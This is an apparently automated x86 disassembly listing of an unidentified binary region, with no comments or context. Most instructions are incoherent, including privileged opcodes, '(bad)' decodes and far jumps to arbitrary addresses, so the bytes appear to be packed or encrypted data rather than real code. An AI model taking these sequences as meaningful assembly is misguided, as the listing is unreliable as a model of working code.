  4307fe:	ror    cl,0xb1
  430801:	sub    dh,ah
  430803:	cmp    al,0xbc
  430805:	sub    al,0xc3
  430807:	mov    ebx,0x50c3fe7c
  43080c:	scas   eax,DWORD PTR es:[edi]
  43080d:	push   0xd196764a
  430812:	icebp  
  430813:	sub    edi,edi
  430815:	mov    ch,0x64
  430817:	mov    al,ds:0xbab70238
  43081c:	lods   eax,DWORD PTR ds:[esi]
  43081d:	sbb    eax,0x8dc49fac
  430822:	xchg   edx,eax
  430823:	mov    dl,0x99
  430825:	mov    ecx,0x365d7bc1
  43082a:	into   
  43082b:	icebp  
  43082c:	das    
  43082d:	js     0x4307ef
  43082f:	fcom   DWORD PTR [eax]
  430831:	sub    BYTE PTR [esi],dh
  430833:	dec    esp
  430834:	addr16 xchg edx,eax
  430836:	mov    eax,0xf469cfdc
  43083b:	shl    DWORD PTR [esi+0x544f3169],cl
  430841:	das    
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	pop    ebp
  4308c1:	test   BYTE PTR [ecx],0xf1
  4308c4:	push   es
  4308c5:	add    DWORD PTR [edx],eax
  4308c7:	add    dh,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [ebx-0x1f],dl
  4308ce:	ins    BYTE PTR es:[edi],dx
  4308cf:	cs in  al,0x22
  4308d2:	or     DWORD PTR [ebp+0x5f],ebp
  4308d5:	push   ebp
  4308d6:	int3   
  4308d7:	mov    ds:0x43045480,al
  4308dc:	add    al,0x9a
  4308de:	mov    ds:0xe8138574,al
  4308e3:	shl    BYTE PTR [ecx],cl
  4308e5:	mov    ah,0x59
  4308e7:	sti    
  4308e8:	outs   dx,DWORD PTR ds:[esi]
  4308e9:	jno    0x430878
  4308eb:	mov    esi,0x8c8a0dd3
  4308f0:	mov    ecx,DWORD PTR [ebx+0x5195b4af]
  4308f6:	jae    0x4308c6
  4308f8:	mov    al,0x1d
  4308fa:	sar    edi,1
  4308fc:	sub    DWORD PTR [ebp+esi*8-0x25468000],esi
  430903:	loopne 0x4308ed
  430905:	sbb    eax,0x3ef0d30a
  43090a:	adc    edx,DWORD PTR [esi+0x11]
  43090d:	ins    BYTE PTR es:[edi],dx
  43090e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43090f:	xlat   BYTE PTR ds:[ebx]
  430910:	push   esi
  430911:	fcomp  st(6)
  430913:	aaa    
  430914:	dec    eax
  430915:	dec    esp
  430916:	jg     0x43094c
  430918:	mov    ds:0x45040145,eax
  43091d:	inc    BYTE PTR [edi]
  43091f:	pushf  
  430920:	mov    BYTE PTR ds:0xcb28f1a4,bh
  430926:	inc    esi
  430927:	int    0xe8
  430929:	out    dx,eax
  43092a:	mov    cl,0x97
  43092c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43092d:	sahf   
  43092e:	fidiv  WORD PTR [eax]
  430930:	lods   eax,DWORD PTR ds:[esi]
  430931:	and    eax,0x562fcd9c
  430936:	dec    eax
  430937:	stc    
  430938:	lds    ebp,FWORD PTR [edx-0x6a]
  43093b:	pop    ss
  43093c:	mov    bh,0x9a
  43093e:	ja     0x430998
  430940:	fnstcw WORD PTR [eax]
  430942:	or     BYTE PTR [ebp-0xec92d4b],cl
  430948:	int3   
  430949:	xchg   DWORD PTR [edi+0x4f],ebp
  43094c:	jb     0x4308d2
  43094e:	cmp    cl,dl
  430950:	enter  0xef3,0x7e
  430954:	rcr    BYTE PTR ds:0x5e1a1345,1
  43095a:	cmc    
  43095b:	arpl   WORD PTR [edi-0x547a23c3],si
  430961:	es add al,0xef
  430964:	sbb    edx,edx
  430966:	push   DWORD PTR [ebx+ecx*4+0x18794830]
  43096d:	aam    0xfe
  43096f:	das    
  430970:	jae    0x43094e
  430972:	mov    ds:0x38ae40f3,al
  430977:	into   
  430978:	retf   
  430979:	push   esi
  43097a:	ja     0x430912
  43097c:	push   eax
  43097d:	push   edx
  43097e:	xor    ah,BYTE PTR [edx+ebx*4]
  430981:	adc    eax,0x382d9fb2
  430986:	rol    DWORD PTR [ebx+0x71],0xb4
  43098a:	fsub   DWORD PTR [ebp+0x44934188]
  430990:	add    BYTE PTR [ecx+0x60],0x3d
  430994:	sub    al,0x35
  430996:	cmp    al,BYTE PTR [eax-0x13]
  430999:	mov    cl,0xbe
  43099b:	daa    
  43099c:	jbe    0x4309df
  43099e:	pop    esp
  43099f:	mov    esi,0x66feb793
  4309a4:	inc    esp
  4309a5:	pop    ecx
  4309a6:	xor    eax,0x9c3c1cb
  4309ab:	add    DWORD PTR [esp+eax*4-0x1f],edx
  4309af:	lock pop esi
  4309b1:	(bad)  
  4309b2:	ds test ebx,edi
  4309b5:	mov    ch,0xc4
  4309b7:	push   esi
  4309b8:	jbe    0x43093d
  4309ba:	lock or ch,BYTE PTR [ebx+0x145ab32f]
  4309c1:	fiadd  WORD PTR [eax]
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x2e7f0437
  430a43:	(bad)  
  430a44:	cld    
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    bl,bh
  430a4d:	inc    eax
  430a4e:	mov    ebp,0x1acf35e3
  430a53:	push   edi
  430a54:	lahf   
  430a55:	pop    eax
  430a56:	push   ebp
  430a57:	repz (bad) 
  430a5a:	shr    BYTE PTR [esi+0x101d12b0],cl
  430a60:	retf   
  430a61:	clc    
  430a62:	sub    edx,DWORD PTR [eax+ebx*8]
  430a65:	dec    eax
  430a66:	xchg   edi,eax
  430a67:	sub    BYTE PTR [esi+0x74ea27f6],bl
  430a6d:	push   ss
  430a6e:	es add bh,dl
  430a71:	fsub   st(4),st
  430a73:	mov    edx,gs
  430a75:	std    
  430a76:	hlt    
  430a77:	ret    
  430a78:	push   ds
  430a79:	inc    esi
  430a7a:	sbb    ebp,DWORD PTR [edx+0x2a66a3ef]
  430a80:	jmp    FWORD PTR [ecx+0x3b]
  430a83:	mov    WORD PTR [edi+edi*1+0x13e1cc7d],es
  430a8a:	mov    al,0x4b
  430a8c:	test   DWORD PTR [ecx+0x658a2724],edi
  430a92:	(bad)  
  430a93:	js     0x430ac6
  430a95:	or     DWORD PTR [ecx],ebx
  430a97:	(bad)  
  430a98:	sbb    al,0x17
  430a9a:	aas    
  430a9b:	(bad)  
  430a9c:	mov    ch,0x21
  430a9e:	scas   eax,DWORD PTR es:[edi]
  430a9f:	pop    es
  430aa0:	nop
  430aa1:	cdq    
  430aa2:	pop    ds
  430aa3:	jge    0x430ad5
  430aa5:	mov    ecx,0x74fb903a
  430aaa:	aas    
  430aab:	(bad)  [ebp+0x42]
  430aae:	add    BYTE PTR [edx-0x286a87bb],bl
  430ab4:	cmp    BYTE PTR [edi-0x4e85988c],dh
  430aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430abb:	jmp    0x430a62
  430abd:	jo     0x430a5d
  430abf:	pop    ebx
  430ac0:	xlat   BYTE PTR ds:[ebx]
  430ac1:	xchg   DWORD PTR [eax],edx
  430ac3:	gs jns 0x430a72
  430ac6:	adc    al,0xfc
  430ac8:	dec    edx
  430ac9:	aam    0xb0
  430acb:	retf   0xc327
  430ace:	clc    
  430acf:	cmp    DWORD PTR [edx-0x6e],ebx
  430ad2:	xchg   ebp,eax
  430ad3:	mov    cl,0xc9
  430ad5:	in     al,0xb3
  430ad7:	xor    BYTE PTR [esi-0x1c],0xb5
  430adb:	push   ds
  430adc:	jg     0x430a8c
  430ade:	and    DWORD PTR [esp+ecx*8-0x57],0xffffff9c
  430ae3:	or     DWORD PTR [eax-0x32],0x142762df
  430aea:	mov    esi,0x366c210a
  430aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430af0:	sbb    DWORD PTR es:[si+0x36],edx
  430af5:	xchg   ecx,eax
  430af6:	fnstenv [eax-0x28fcff5b]
  430afc:	popa   
  430afd:	pop    ebx
  430afe:	or     ch,BYTE PTR cs:[eax-0x4dae20c7]
  430b05:	loopne 0x430b06
  430b07:	and    dl,BYTE PTR [ebp-0x17]
  430b0a:	dec    esp
  430b0b:	cwde   
  430b0c:	div    eax
  430b0e:	mov    ds:0xc0e70f88,al
  430b13:	or     BYTE PTR [ecx-0x54],al
  430b16:	dec    ecx
  430b17:	push   ss
  430b18:	inc    edi
  430b19:	cmp    dl,bl
  430b1b:	outs   dx,BYTE PTR ds:[esi]
  430b1c:	add    DWORD PTR [ebp-0x44],ecx
  430b1f:	into   
  430b20:	push   esi
  430b21:	xchg   ebp,eax
  430b22:	out    0x2f,eax
  430b24:	shr    ecx,1
  430b26:	inc    ecx
  430b27:	mul    DWORD PTR [esi+esi*4-0xc4260ca]
  430b2e:	or     DWORD PTR [eax+0x2012b58f],eax
  430b34:	(bad)  
  430b35:	and    al,bl
  430b37:	sbb    BYTE PTR [ebp+0xad7409b],0xfe
  430b3e:	cmp    DWORD PTR [edi+0x86c],0x0
	...
  430bb1:	add    BYTE PTR [eax],al
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0x9844:0x3f4217e6
  430bc2:	les    eax,FWORD PTR [edx+esi*8+0x2]
  430bc6:	add    al,BYTE PTR [eax]
  430bc8:	test   BYTE PTR [eax],0x0
  430bcb:	add    BYTE PTR [ecx],al
  430bcd:	mov    bl,0x12
  430bcf:	jmp    0x16ab:0x21c44d14
  430bd6:	sbb    DWORD PTR [ebx-0x36],edx
  430bd9:	scas   eax,DWORD PTR es:[edi]
  430bda:	mov    eax,0x3612f12d
  430bdf:	mov    ecx,0xe4ec2322
  430be4:	cmp    esp,DWORD PTR [edi-0x56]
  430be7:	xor    cl,BYTE PTR [eax+0x1a3059d0]
  430bed:	lods   eax,DWORD PTR ds:[esi]
  430bee:	test   BYTE PTR [esi+0x67],cl
  430bf1:	xchg   ecx,eax
  430bf2:	dec    edx
  430bf3:	fiadd  WORD PTR [ebp-0xa]
  430bf6:	dec    edx
  430bf7:	pop    ecx
  430bf8:	retf   
  430bf9:	imul   ebx,esi,0xc2fa1cea
  430bff:	or     al,0x69
  430c01:	in     al,dx
  430c02:	sbb    BYTE PTR [ebp-0x7160116b],0x5e
  430c09:	aaa    
  430c0a:	cdq    
  430c0b:	inc    esp
  430c0c:	leave  
  430c0d:	and    ah,0xc5
  430c10:	loope  0x430be9
  430c12:	mov    ds:0xe54f8d1f,eax
  430c17:	ins    BYTE PTR es:[edi],dx
  430c18:	mov    eax,0x926da816
  430c1d:	add    al,0xc7
  430c1f:	xchg   ebx,eax
  430c20:	ins    DWORD PTR es:[edi],dx
  430c21:	pop    ecx
  430c22:	xchg   esp,eax
  430c23:	sbb    eax,0x9079cdbc
  430c28:	in     al,dx
  430c29:	dec    ebp
  430c2a:	add    eax,0xdefacab
  430c2f:	mov    esp,0x4df57598
  430c34:	(bad)  
  430c35:	(bad)  
  430c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c37:	xchg   ebx,eax
  430c38:	scas   eax,DWORD PTR es:[edi]
  430c39:	loope  0x430c7b
  430c3b:	aad    0xa6
  430c3d:	cmp    BYTE PTR [ecx-0x71],dl
  430c40:	shl    DWORD PTR [edx-0x20],0xdc
  430c44:	lahf   
  430c45:	mov    di,di
  430c48:	jmp    0xfb7d:0x2e42dbed
  430c4f:	mov    cl,0x2f
  430c51:	jl     0x430c45
  430c53:	int    0x5b
  430c55:	int    0xa1
  430c57:	push   edi
  430c58:	pop    esi
  430c59:	rol    DWORD PTR ds:0x98c7c336,cl
  430c5f:	lahf   
  430c60:	lds    esi,FWORD PTR [eax+ebp*1+0x5d]
  430c64:	jp     0x430c65
  430c66:	mov    esp,0xfc739b4c
  430c6b:	(bad)  
  430c6c:	push   cs
  430c6d:	loope  0x430cba
  430c6f:	cdq    
  430c70:	sub    eax,0x9bddf151
  430c75:	test   BYTE PTR [ecx-0x24],dh
  430c78:	retf   0xc8b4
  430c7b:	inc    BYTE PTR [eax]
  430c7d:	sti    
  430c7e:	push   cs
  430c7f:	scas   al,BYTE PTR es:[edi]
  430c80:	lock sbb eax,esp
  430c83:	sub    eax,0xad63cb30
  430c88:	fild   DWORD PTR [ecx+0x65f34d24]
  430c8e:	aad    0x0
  430c90:	jecxz  0x430c72
  430c92:	mov    BYTE PTR [edi+0x66fae62d],dh
  430c98:	popa   
  430c99:	test   DWORD PTR [esi-0x40],0x401772f
  430ca0:	sbb    BYTE PTR [ebp+ebx*4+0x33],0x9f
  430ca5:	jne    0x430d1b
  430ca7:	stc    
  430ca8:	mov    eax,0x26a05f21
  430cad:	cmp    bh,BYTE PTR [eax+ebx*2-0x689647f6]
  430cb4:	pushf  
  430cb5:	xor    DWORD PTR [edx],edx
  430cb7:	jno    0x430cf0
  430cb9:	fcom   st(7)
  430cbb:	jae    0x430ce9
  430cbd:	stc    
  430cbe:	fidivr DWORD PTR [edx+0x68]
  430cc1:	rol    BYTE PTR [eax],1
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d68
  430d41:	(bad)  
  430d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d43:	mov    al,0xe8
  430d45:	add    eax,DWORD PTR [edx]
  430d47:	add    dh,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [edi-0x110c24a3],dh
  430d51:	in     al,dx
  430d52:	lahf   
  430d53:	cs loop 0x430d9c
  430d56:	push   esp
  430d57:	ins    BYTE PTR es:[edi],dx
  430d58:	repz push 0xd
  430d5b:	sub    DWORD PTR [ecx-0x1],edi
  430d5e:	mov    edi,0xb7a4339d
  430d63:	adc    DWORD PTR [esi],0xffffffd3
  430d66:	xchg   BYTE PTR [eax],ah
  430d68:	enter  0x6ff4,0xf1
  430d6c:	sbb    al,0x35
  430d6e:	push   ebp
  430d6f:	pop    edx
  430d70:	arpl   WORD PTR [ebx+0x378d8a5b],cx
  430d76:	jge    0x430d1c
  430d78:	or     DWORD PTR [ebx+0x335cb598],0x61afa073
  430d82:	ds test al,0xb4
  430d85:	aam    0xef
  430d87:	std    
  430d88:	cmp    al,0xa0
  430d8a:	push   0x80c3e101
  430d8f:	imul   ebp,DWORD PTR [esi+0x4e],0x5
  430d93:	cld    
  430d94:	cmp    DWORD PTR [ebp+0x9],0xffffffcc
  430d98:	jge    0x430da7
  430d9a:	daa    
  430d9b:	add    BYTE PTR [ecx+0x30],bh
  430d9e:	pop    esi
  430d9f:	std    
  430da0:	xchg   esi,eax
  430da1:	sbb    DWORD PTR [ecx],ebp
  430da3:	adc    al,0xb6
  430da5:	xchg   edx,eax
  430da6:	inc    eax
  430da7:	pop    ds
  430da8:	fld    st(0)
  430daa:	pop    es
  430dab:	xchg   edx,eax
  430dac:	add    DWORD PTR [edx],ebx
  430dae:	(bad)  
  430daf:	stos   BYTE PTR es:[edi],al
  430db0:	mov    esi,0x788b2971
  430db5:	leave  
  430db6:	out    dx,al
  430db7:	mov    dh,0x2f
  430db9:	inc    ebp
  430dba:	xchg   ecx,eax
  430dbb:	add    eax,0xe3716cad
  430dc0:	xchg   edi,eax
  430dc1:	cwde   
  430dc2:	mov    dx,WORD PTR [ebp-0x10]
  430dc6:	daa    
  430dc7:	sbb    ebx,DWORD PTR [edx-0x56]
  430dca:	inc    esi
  430dcb:	sub    al,0xe2
  430dcd:	push   ebx
  430dce:	pop    es
  430dcf:	sbb    eax,0x20e65c0c
  430dd4:	mov    bl,0xca
  430dd6:	rcr    DWORD PTR [ebp+0x37],cl
  430dd9:	push   es
  430dda:	mov    ecx,0xc941b82a
  430ddf:	retf   
  430de0:	and    BYTE PTR [ebp-0xbd51ba8],cl
  430de6:	sub    bl,BYTE PTR [eax+0x2e87e3e]
  430dec:	ins    DWORD PTR es:[edi],dx
  430ded:	mov    esi,0x16292283
  430df2:	stos   DWORD PTR es:[edi],eax
  430df3:	mov    ds:0x42a9bf70,al
  430df8:	sbb    eax,0x402343b9
  430dfd:	jb     0x430dc3
  430dff:	gs mov esp,0xabe61abb
  430e05:	out    0x87,eax
  430e07:	sub    al,0x73
  430e09:	gs mov al,0xde
  430e0c:	ins    DWORD PTR es:[edi],dx
  430e0d:	jmp    0xa3bd:0xa425ee7f
  430e14:	out    0x60,al
  430e16:	bound  eax,QWORD PTR [esi]
  430e18:	push   eax
  430e19:	sahf   
  430e1a:	fcomi  st,st(3)
  430e1c:	jecxz  0x430e2d
  430e1e:	adc    bh,bh
  430e20:	mov    dl,0xc8
  430e22:	sti    
  430e23:	mov    edi,DWORD PTR ds:0xa3d5d2d
  430e29:	xor    ch,dh
  430e2b:	cwde   
  430e2c:	cdq    
  430e2d:	adc    DWORD PTR [eiz*8+0x59b407c6],eax
  430e34:	ret    0x396b
  430e37:	je     0x430e91
  430e39:	sahf   
  430e3a:	jae    0x430eba
  430e3c:	in     al,dx
  430e3d:	push   ebx
  430e3e:	aaa    
  430e3f:	xlat   BYTE PTR ds:[ebx]
  430e40:	xchg   ecx,eax
  430e41:	sub    DWORD PTR [eax],eax
	...
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430f34
  430ec1:	in     eax,dx
  430ec2:	fist   DWORD PTR [edi+0x204de]
  430ec8:	retf   
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [ebx],cl
  430ecd:	ins    DWORD PTR es:[edi],dx
  430ece:	test   al,0x1e
  430ed0:	rcl    edx,cl
  430ed2:	dec    ebx
  430ed3:	xchg   ecx,eax
  430ed4:	sub    ecx,edi
  430ed6:	and    ebx,DWORD PTR [ebp-0x72ef2f62]
  430edc:	loop   0x430e63
  430ede:	sub    al,0xa7
  430ee0:	test   edx,edx
  430ee2:	retf   
  430ee3:	imul   esp,DWORD PTR [eax+0x1db5066a],0xd
  430eea:	dec    ebx
  430eeb:	mov    ss,WORD PTR [edi+0x56871735]
  430ef1:	scas   eax,DWORD PTR es:[edi]
  430ef2:	inc    ecx
  430ef3:	xchg   edi,eax
  430ef4:	jg     0x430ec7
  430ef6:	pop    esi
  430ef7:	dec    edi
  430ef8:	aas    
  430ef9:	pop    ss
  430efa:	dec    eax
  430efb:	int    0x57
  430efd:	outs   dx,BYTE PTR ds:[esi]
  430efe:	sub    esp,esi
  430f00:	cmp    eax,0xa7440bc8
  430f05:	xchg   esi,eax
  430f06:	add    al,0xc
  430f08:	xor    al,0x42
  430f0a:	aad    0x50
  430f0c:	stos   DWORD PTR es:[edi],eax
  430f0d:	jne    0x430f74
  430f0f:	cmp    eax,0x7419113f
  430f14:	pop    ds
  430f15:	push   ecx
  430f16:	cmp    eax,0x56a97af7
  430f1b:	push   eax
  430f1c:	int3   
  430f1d:	jo     0x430ee6
  430f1f:	jmp    0x430ea1
  430f21:	rcl    esp,1
  430f23:	das    
  430f24:	cdq    
  430f25:	adc    esp,DWORD PTR [esi*1-0x56ff1bf1]
  430f2c:	xor    eax,0xce9a2dc5
  430f31:	and    esi,DWORD PTR [ecx+0x59dc37b6]
  430f37:	stos   BYTE PTR es:[edi],al
  430f38:	jge    0x430f74
  430f3a:	mov    dl,0xff
  430f3c:	xchg   ebx,eax
  430f3d:	test   al,0xa
  430f3f:	pushf  
  430f40:	xchg   DWORD PTR [esi+0x2e],ebp
  430f43:	xor    esi,edx
  430f45:	push   ecx
  430f46:	mov    bl,cl
  430f48:	and    ah,ch
  430f4a:	ins    DWORD PTR es:[edi],dx
  430f4b:	cmp    BYTE PTR [ebx-0x6d3780f7],bl
  430f51:	dec    edx
  430f52:	(bad)  
  430f53:	call   0xfa92e1df
  430f58:	jmp    0x430f9a
  430f5a:	dec    bx
  430f5c:	sbb    ebx,DWORD PTR [edx+0x6]
  430f5f:	in     al,0x21
  430f61:	(bad)  
  430f62:	push   0xffffffcd
  430f64:	mov    ebx,0xc1cb35c2
  430f69:	jp     0x430f8e
  430f6b:	int    0xd9
  430f6d:	xchg   DWORD PTR [esi],ebx
  430f6f:	xchg   ebx,eax
  430f70:	in     eax,0xf2
  430f72:	ficomp WORD PTR [esi]
  430f74:	xchg   esp,eax
  430f75:	mov    dh,0x24
  430f77:	sub    DWORD PTR [eax-0x15394b25],ebx
  430f7d:	fist   DWORD PTR [ebp+0x60c030f4]
  430f83:	ss inc ebp
  430f85:	mov    DWORD PTR [ebx-0xb],ecx
  430f88:	cmp    DWORD PTR [edi+0x7b1e18e2],eax
  430f8e:	sahf   
  430f8f:	adc    DWORD PTR [esi],esp
  430f91:	pop    ds
  430f92:	xchg   BYTE PTR [eax+0x82a96],ch
	...
  430fb4:	dec    ebp
  430fb5:	push   ebp
  430fb6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  430fbc:	mov    esp,ebp
  430fbe:	or     al,ah
  430fc0:	dec    ebp
  430fc1:	add    bh,al
  430fc3:	add    BYTE PTR [eax],cl
  430fc5:	add    BYTE PTR [eax],al
  430fc7:	mov    DWORD PTR [eax],0x3ef44545
  430fcd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  430fd4:	retf   
  430fd5:	(bad)  
  430fd6:	enter  0x4d45,0xb8
  430fda:	mov    edi,DWORD PTR [ecx]
  430fdc:	hlt    
  430fdd:	test   ebx,ecx
  430fdf:	pushf  
  430fe0:	enter  0x4df8,0x8b
  430fe4:	mov    DWORD PTR [ebp+0x8],0x894708
  430feb:	inc    ebp
  430fec:	mov    ebp,0xff8bfffc
  430ff1:	dec    ebp
  430ff2:	mov    ch,0xf4
  430ff4:	call   DWORD PTR [ebx-0x1]
  430ff7:	mov    ebx,0x8005122
  430ffc:	call   DWORD PTR [ecx+0x8]
  430fff:	pop    es
  431000:	jmp    0xb8:0x9cb4533
  431007:	cdq    
  431008:	mov    esi,DWORD PTR [edx-0xc]
  43100b:	xor    al,bl
  43100d:	add    BYTE PTR [ecx+0x3c83203],bl
  431013:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431019:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43101f:	xor    eax,DWORD PTR [eax]
  431021:	retf   
  431022:	ret    
  431023:	add    eax,esi
  431025:	enter  0x8945,0x64
  431029:	dec    ebp
  43102a:	sbb    ah,cl
  43102c:	add    BYTE PTR [ebx-0xb87b277],cl
  431032:	dec    DWORD PTR [ebx-0xbcfb275]
  431038:	test   DWORD PTR [ebx],esi
  43103a:	dec    ebx
  43103c:	inc    DWORD PTR [ebx]
  43103e:	inc    eax
  43103f:	enter  0x8989,0x64
  431043:	(bad)  
  431044:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431048:	cld    
  431049:	dec    DWORD PTR [ebp-0xa90001]
  43104f:	push   edi
  431050:	mov    BYTE PTR [edx+0x1],ch
  431053:	and    BYTE PTR [eax],al
  431055:	pop    ecx
  431056:	inc    ebp
  431057:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43105d:	push   0xffffff89
  43105f:	pop    ecx
  431060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431061:	dec    ebp
  431062:	add    BYTE PTR [ecx+0x45fc088b],cl
  431068:	jne    0x4310b2
  43106a:	lea    eax,[eax]
  43106c:	fs (bad) 
  43106e:	dec    DWORD PTR [eax]
  431070:	mov    DWORD PTR [eax],eax
  431072:	test   al,0x0
  431074:	add    BYTE PTR [ebp-0x18],cl
  431077:	xor    ebp,DWORD PTR [edx]
  431079:	add    eax,DWORD PTR [eax]
  43107b:	mov    eax,eax
  43107d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431084:	inc    ebp
  431085:	mov    DWORD PTR [ebx+0x459408],ecx
  43108b:	popa   
  43108c:	mov    esp,DWORD PTR [ebp-0x75]
  43108f:	(bad)  
  431090:	cld    
  431091:	inc    eax
  431092:	cmp    bh,0x1
  431095:	lea    eax,[eax]
  431097:	and    BYTE PTR [eax],al
  431099:	inc    DWORD PTR [ecx-0x18]
  43109c:	mov    ecx,DWORD PTR [ebx]
  43109e:	cld    
  43109f:	add    BYTE PTR [ecx+0x75014d],cl
  4310a5:	(bad)  
  4310a6:	xchg   ebp,eax
  4310a7:	sar    bh,1
  4310a9:	inc    eax
  4310aa:	inc    DWORD PTR [eax]
  4310ac:	mov    eax,DWORD PTR [ebp-0x4]
  4310af:	xor    edx,DWORD PTR [edx+0x7201be]
  4310b5:	add    BYTE PTR [edx],dl
  4310b7:	(bad)  
  4310b8:	nop
  4310b9:	inc    ebp
  4310ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4310c0:	mov    al,0xff
  4310c2:	add    bh,bh
  4310c4:	add    BYTE PTR [ebx],dh
  4310c6:	inc    DWORD PTR [ebx]
  4310c8:	sbb    al,0x89
  4310ca:	jne    0x4310a8
  4310cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4310d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4310d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4310df:	inc    DWORD PTR [ebp-0x75]
  4310e2:	(bad)  [esi+ebp*8]
  4310e5:	test   DWORD PTR [esi-0x1],esp
  4310e8:	inc    ebp
  4310e9:	(bad)  
  4310ea:	aas    
  4310eb:	inc    ebp
  4310ec:	(bad)  
  4310ed:	lea    edi,[eax+edi*2-0x1]
  4310f1:	inc    edi
  4310f3:	mov    DWORD PTR [ecx],edi
  4310f5:	mov    al,ds:0x8b8000c7
  4310fa:	call   0x45d0f3fb
  4310ff:	(bad)  
  431100:	out    dx,al
  431101:	(bad)  
  431102:	fisttp WORD PTR [eax+0x8801c7]
  431108:	jecxz  0x43114f
  43110a:	call   0xe83f570e
  43110f:	lea    edi,[edi]
  431111:	(bad)  
  431112:	call   0xcb3c16
  431117:	add    DWORD PTR [ebx-0x7f570400],ecx
  43111d:	add    BYTE PTR [ecx],al
  43111f:	test   DWORD PTR [eax],eax
  431121:	wrmsr  
  431123:	jae    0x431112
  431125:	add    BYTE PTR [eax],al
  431127:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43112d:	add    esp,edi
  43112f:	add    BYTE PTR [eax+0x450108],al
  431135:	mov    edi,DWORD PTR [ebp-0x6c]
  431138:	add    DWORD PTR [eax],0x4
  43113b:	mov    eax,DWORD PTR [ebp+0x3]
  43113e:	mov    edi,DWORD PTR [esp+edi*8]
  431141:	dec    ebp
  431142:	nop
  431143:	mov    eax,DWORD PTR [ecx]
  431145:	fadd   DWORD PTR [eax]
  431147:	add    BYTE PTR [esi],al
  431149:	lea    eax,[eax]
  43114b:	pusha  
  43114c:	push   eax
  43114d:	inc    DWORD PTR [ebp+0x52]
  431150:	call   DWORD PTR [ebp-0x7b]
  431153:	mov    esi,DWORD PTR [ebp-0x74]
  431156:	mov    eax,DWORD PTR [eax]
  431158:	cld    
  431159:	mov    eax,DWORD PTR [eax+0x880103]
  43115f:	add    BYTE PTR [ebp+0x6a],bh
  431162:	cmp    edi,0x10
  431165:	mov    WORD PTR [ebp+0x0],es
  431168:	mov    edx,DWORD PTR [edx-0x4]
  43116b:	push   ecx
  43116c:	nop
  43116d:	inc    DWORD PTR [ecx]
  43116f:	cld    
  431170:	add    BYTE PTR [ebp-0x24],bh
  431173:	mov    eax,DWORD PTR [eax]
  431175:	cld    
  431176:	push   eax
  431177:	nop
  431178:	inc    ebp
  431179:	add    edi,edi
  43117b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431181:	jmp    0xe33b:0x9403c733
  431188:	movntq QWORD PTR [esi],mm6
  43118b:	mov    DWORD PTR [eax],0xb87e8b98
  431191:	test   ebx,eax
  431193:	jmp    DWORD PTR [edi-0x1]
  431196:	int    0xe9
  431198:	sub    esp,esi
  43119a:	add    eax,DWORD PTR [ebp-0x30]
  43119d:	fild   WORD PTR [ebp+0x3f]
  4311a0:	cmp    eax,edi
  4311a2:	je     0xcc43f7c4
  4311a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4311af:	(bad)  
  4311b0:	jne    0x43113e
  4311b2:	mov    ebx,ecx
  4311b4:	cld    
  4311b5:	jle    0x4311fc
  4311b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4311bd:	inc    ebp
  4311be:	call   0xeb3b4e
  4311c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4311c9:	add    DWORD PTR es:[eax],eax
  4311cc:	add    al,al
  4311ce:	xor    BYTE PTR [eax+0x41],dl
  4311d1:	inc    ebp
  4311d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4311d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4311de:	add    DWORD PTR [ecx+0x458be845],ecx
  4311e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4311ea:	cld    
  4311eb:	call   0xd83cb0
  4311f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4311f6:	add    al,al
  4311f8:	push   eax
  4311f9:	es inc ebp
  4311fb:	inc    ebp
  4311fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431202:	dec    DWORD PTR [ebx-0x3ff70301]
